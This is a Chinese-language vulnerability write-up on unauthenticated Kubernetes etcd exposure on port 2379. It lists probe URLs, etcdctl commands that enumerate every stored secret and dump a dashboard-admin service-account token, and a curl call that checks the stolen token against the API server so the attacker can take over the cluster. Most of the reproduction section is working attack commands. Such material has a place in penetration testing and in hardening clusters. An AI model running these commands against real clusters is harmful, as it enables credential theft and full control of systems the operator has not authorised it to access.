# K8s etcd未授权访问

## 漏洞描述

etcd 是云原生架构中重要的基础组件。etcd 在微服务和 Kubernates 集群中不仅可以作为服务注册于发现，还可以作为 key-value 存储的中间件，为 k8s 集群提供底层数据存储，保存了整个集群的状态。

在 K8s 集群初始化后，etcd 默认就以 pod 的形式存在，可以执行如下命令进行查看，etcd 组件监听的端口为 2379，并且对外开放。

```
kubectl get pods -A | grep etcd
```

在 etcd 的配置文件 /etc/kubernetes/manifests/etcd.yaml 中，--client-cert-auth 默认为 true，这意味着访问 etcd 服务需要携带 cert 进行认证。

如果目标在启动 etcd 的时候没有开启证书认证选项，且 2379 端口直接对外开放的话，则存在 etcd 未授权访问漏洞。

etcdctl 下载地址：https://github.com/etcd-io/etcd

## 漏洞复现

### 查看是否存在未授权访问

访问以下链接，查看是否存在未授权访问。

```
https://your-ip:2379/version
-------------
返回如下则存在未授权访问：
{etcdserver: "3.4.3", etcdcluster: "3.4.0"} 
```

```
https://your-ip:2379/v2/keys
-------------
返回如下则存在未授权访问：
{"action":"get","node":{"dir":true,"nodes":...}}
```

### 查找 Token 接管集群

由于 Service Account 关联了一套凭证，存储在 Secret 中。因此我们可以过滤 Secret，查找具有高权限的 Secret，然后获得其 token 接管 K8s 集群。

```
#查找所有的 secret
./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://your-ip:2379/ get / --prefix --keys-only|sort|uniq| grep secret
```

以 `/registry/secrets/kube-system/dashboard-admin-token-c7spp` 为例，查看指定 secret 保存的证书和 token：

```
#查找指定 secret 保存的证书和 token
./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://your-ip:2379/ get /registry/secrets/kube-system/dashboard-admin-token-c7spp
```

最终的 token 为 `token?` 和 `\#kubernetes.io/service-account-token` 之间的部分。可以使用 curl 验证 token 的有效性：

```
curl --header "Authorization: Token" -X GET https://your-ip:6443/api -k
```

然后，就可以使用 token 登录 dashboard 或者远程命令管理 K8s。